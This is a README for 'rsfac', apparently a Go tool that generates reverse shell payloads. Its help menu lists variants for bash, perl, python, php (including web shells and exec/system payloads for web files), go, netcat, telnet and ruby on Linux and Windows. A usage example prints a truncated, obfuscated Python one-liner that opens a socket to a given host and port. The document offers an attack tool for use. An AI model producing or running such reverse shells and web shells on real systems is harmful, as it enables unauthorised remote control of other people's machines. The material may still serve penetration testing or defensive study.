<h1 align="center">rsfac</h1>
<p align="center">Reverse Shell Factory</p>
<p align="center">It is simple to create many types of reverse shell by command line.</p>
<p align="center">Golang</p>



***

## Help Menu
```
REVERSE SHELL FACTORY 2.0

COMMANDS DESCRIPTION
-------- -----------
-h       Help Menu.
-host    Local Host.
-port    Local Port.
-p       Payload.
-os      Operating system.
-v       Version of the payload

LIST OF PAYLOADS
---- -- --------
bash
    default - Normal payload.
    tiny    - To put inside of bash files.
    udp     - UDP connection.
    exec    - Use function exec(). To put inside of bash files.

perl
    linux
        default - Normal payload.
    windows
        default - Normal payload.

py
    linux
        default - Normal payload.
        pty     - Auto spawn pty.
        py3     - Python3.
    windows
        default - Normal payload.

php
    linux
        default                  - Normal payload.
        USED IN WEB PHP FILES:
        exec-reverseshell        - Function exec().
        exec-reverseshell-full   - With php header and footer.
        system-reverseshell      - Function system().
        system-reverseshell-full - With php header and footer.
        webshell                 - Simple web shell.

go
    linux
        default - Normal payload for execution in command line.
        tiny    - Payload to put in files.

nc
    linux
        default - Normal payload.
        c       - Shell command with bash as default.
        e       - Program to exec with bash as default.

telnet
    linux
        default - Normal payload.

ryby 
    linux
        default - Normal payload.
    windows
        default - Normal payload.
```
## Usage Example

```
go run rsfac.go -host 0.0.0.0 -port 6666 -p py -os windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('0.0.0.0', 6666)),....

OR

go build rsfac.go
./rsfac -host 0.0.0.0 -port 6666 -p py -os windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('0.0.0.0', 6666)),....
```
